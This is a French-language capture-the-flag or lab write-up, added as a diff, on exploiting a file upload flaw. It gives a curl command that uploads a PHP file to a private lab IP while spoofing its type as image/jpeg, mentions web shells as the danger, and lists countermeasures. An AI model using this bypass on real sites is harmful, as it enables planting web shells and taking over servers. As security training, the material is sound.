@@ -1,0 +1,31 @@
+Dans la page file upload, on va test upload un fichier autre que des images et pour cela on va POST via curl avec format =>
+curl -F  "$postFields[‘file’] = “@PATHTOFILE;type=CONTENTTYPEHERE”;
+
+Si on inspect la page:
+
+<input name="uploaded" type="file">
+<input type="submit" name="Upload" value="Upload">
+
+On post donc 'uploaded' avec le path du fichier qu'on veut upload et on ajoute "type=image/jpeg" pour qu'il soit considérer comme une image!
+Et on ajoute 'Upload=Upload' puis enfin url
+
+curl -F 'uploaded=@/path/test.php;type=image/jpeg' -F 'Upload=Upload' http://192.168.162.132/\?page\=upload | grep flag
+
+
+https://medium.com/@petehouston/upload-files-with-curl-93064dcccc76
+https://joshhighland.com/2010/11/27/using-curl-and-php-to-upload-files-through-a-form-post/
+
+
+Danger:
+Uploader un fichier PHP malveillant (web shell par exemple) pour prendre le contrôle total du site web, et de serveur.
+
+Protection:
+https://www.funinformatique.com/faille-upload-comment-lexploiter-et-sen-proteger-partie-1/
+
+    - Générer un nom aléatoire pour le fichier uploadé et enregistrer le nom dans une base de données.
+
+    - Ne pas permettre l’écrasement de fichier.
+
+    - Ne pas permettre de voir l’index of du répertoire d’upload.
+
+    - Vérifier le mime-type avec getimagesize() et l’extension du fichier.
